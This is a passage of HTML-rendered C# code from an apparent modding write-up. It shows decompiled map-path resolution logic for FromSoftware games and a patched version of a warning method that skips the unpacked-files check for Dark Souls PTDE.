style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tDefaultInterpolatedStringHandler defaultInterpolatedStringHandler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new \u003C/span>\u003Cspan style=\"color:#B392F0\">DefaultInterpolatedStringHandler\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">27\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid.\u003C/span>\u003Cspan style=\"color:#B392F0\">Substring\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"_00\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".msb.dcx\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tpreferredPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">ToStringAndClear\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new \u003C/span>\u003Cspan style=\"color:#B392F0\">DefaultInterpolatedStringHandler\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">23\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid.\u003C/span>\u003Cspan style=\"color:#B392F0\">Substring\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">9\u003C/span>\u003Cspan style=\"color:#E1E4E8\">));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"_00\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendFormatted\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(mapid);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tdefaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">AppendLiteral\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tbackupPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultInterpolatedStringHandler.\u003C/span>\u003Cspan style=\"color:#B392F0\">ToStringAndClear\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsPTDE \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsRemastered \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DemonsSouls)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tpreferredPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tbackupPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb.dcx\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.Bloodborne \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsIII \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.EldenRing \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.Type \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.Sekiro)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tpreferredPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb.dcx\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tbackupPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tpreferredPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb.dcx\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tbackupPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">map\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">MapStudio\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \".msb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> null \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> File.\u003C/span>\u003Cspan style=\"color:#B392F0\">Exists\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> preferredPath)) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (writemode \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> null))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tad.AssetPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> preferredPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> null \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> File.\u003C/span>\u003Cspan style=\"color:#B392F0\">Exists\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> backupPath)) \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (writemode \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> null))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tad.AssetPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameModDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> backupPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (File.\u003C/span>\u003Cspan style=\"color:#B392F0\">Exists\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(this.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> preferredPath))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tad.AssetPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> preferredPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\telse\u003C/span>\u003Cspan style=\"color:#F97583\"> if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (File.\u003C/span>\u003Cspan style=\"color:#B392F0\">Exists\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(this.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> backupPath))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\tad.AssetPath \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> this.GameRootDirectory \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> backupPath;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\tad.AssetName \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mapid;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ad;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"patched-version\">Patched Version:\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"csharp\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">private\u003C/span>\u003Cspan style=\"color:#F97583\"> bool\u003C/span>\u003Cspan style=\"color:#B392F0\"> GameNotUnpackedWarning\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#B392F0\">GameType\u003C/span>\u003Cspan style=\"color:#B392F0\"> gameType\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Patch: Skip check for Dark Souls 1 PTDE (for custom map development)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (gameType \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsPTDE)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#6A737D\">// Allow operation without warning\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Keep original check for DS2:SOTFS\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (gameType \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> GameType.DarkSoulsIISOTFS)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        TaskLogs.\u003C/span>\u003Cspan style=\"color:#B392F0\">AddLog\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">            $\"The files for \u003C/span>\u003Cspan style=\"color:#9ECBFF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">gameType\u003C/span>\u003Cspan style=\"color:#9ECBFF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> do not appear to be unpacked. Please use UXM for DS2 to unpack game files\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            LogLevel.Error,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            TaskLogs.LogPriority.High,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">            null\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> false\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    TaskLogs.\u003C/span>\u003Cspan style=\"color:#B392F0\">AddLog\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">        $\"The files for \u003C/span>\u003Cspan style=\"color:#9ECBFF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">gameType\u003C/span>\u003Cspan style=\"color:#9ECBFF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> do not appear to be fully unpacked. Functionality will be limited. Please use UXM selective unpacker to unpack game files\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        LogLevel.Warning,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        TaskLogs.LogPriority.Normal,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        null\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> true\u003C/span>\u003Cspan 